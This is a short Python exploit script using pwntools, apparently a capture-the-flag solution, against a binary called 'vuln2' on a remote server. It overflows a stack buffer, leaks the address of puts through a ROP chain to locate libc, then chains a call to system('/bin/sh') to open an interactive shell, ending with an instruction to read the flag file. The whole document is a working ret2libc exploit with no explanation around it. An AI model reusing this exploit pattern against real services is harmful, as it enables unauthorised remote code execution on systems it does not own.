```python
from pwn import *

context.log_level = 'error'

elf = ELF('./vuln2')
libc = ELF('./libc.so.6')
context.binary = elf

r = remote('34.125.199.248', 6969)

offset = 40
ret = 0x0000000000401020

# ret2libc

# leak puts address
rop = ROP(elf)
rop.call(elf.symbols['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])

payload = [
    b'A' * offset,
    rop.chain()
]

payload = b''.join(payload)

r.recvuntil(b': ')
r.sendline(payload)

r.recvuntil(b'\n\n')

puts = u64(r.recv(6).ljust(8, b'\x00'))

print(f'puts: {hex(puts)}')

libc.address = puts - libc.symbols['puts']

print(f'libc: {hex(libc.address)}')

# final exploit

rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\x00')))
rop.exit()

payload = [
    b'A' * offset,
    p64(ret),
    rop.chain()
]

payload = b''.join(payload)

r.sendline(payload)

r.interactive()
```
then just cat home/flag.txt
